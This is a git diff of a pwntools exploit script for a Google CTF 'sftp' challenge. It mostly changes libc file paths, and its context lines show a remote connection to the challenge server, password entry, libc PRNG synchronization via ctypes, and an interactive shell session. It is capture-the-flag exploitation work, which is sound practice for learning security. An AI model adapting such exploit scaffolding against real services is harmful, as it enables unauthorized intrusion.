@@ -10,7 +10,7 @@ context(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
 
 if not args['REMOTE']:
     binary = ELF('./sftp-amd64-2.23-0ubuntu10')  # https://github.com/integeruser/bowkin
-    libc = ELF('libs/amd64/0ubuntu10/libc-2.23.so')
+    libc = ELF('libs/amd64/2.23/0ubuntu10/libc-2.23.so')
 
     argv = [binary.path]
     envp = {'PWD': os.getcwd()}
@@ -30,12 +30,9 @@ if not args['REMOTE']:
         ''')
     else:
         io = process(argv=argv, env=envp)
-
-    binary.address = io.libs()[binary.path]
-    libc.address = io.libs()[libc.path]
 else:
     binary = ELF('./sftp')
-    libc = ELF('libs/amd64/0ubuntu10/libc-2.23.so')
+    libc = ELF('libs/amd64/2.23/0ubuntu10/libc-2.23.so')
 
     io = remote('sftp.ctfcompetition.com', 1337)
 
@@ -131,7 +128,7 @@ io.sendlineafter('c01db33f@sftp.google.ctf\'s password:', password)
 # the application is now displaying its main menu and waiting for our commands
 
 # load the libc PRNG and initialize it in the same way done by the `sftp` binary (.text:0000555555554EAB)
-libc_dll = ctypes.CDLL('libs/amd64/0ubuntu10/libc-2.23.so')
+libc_dll = ctypes.CDLL('libs/amd64/2.23/0ubuntu10/libc-2.23.so')
 libc_dll.srand(int(time.time()))
 
 # now, we need to synchronize the state of this local PRNG with the state of the PRNG in the running application
@@ -213,7 +210,7 @@ io.interactive()
 #     NX:       NX enabled
 #     PIE:      PIE enabled
 #     FORTIFY:  Enabled
-# [*] 'libs/amd64/0ubuntu10/libc-2.23.so'
+# [*] 'libs/amd64/2.23/0ubuntu10/libc-2.23.so'
 #     Arch:     amd64-64-little
 #     RELRO:    Partial RELRO
 #     Stack:    Canary found
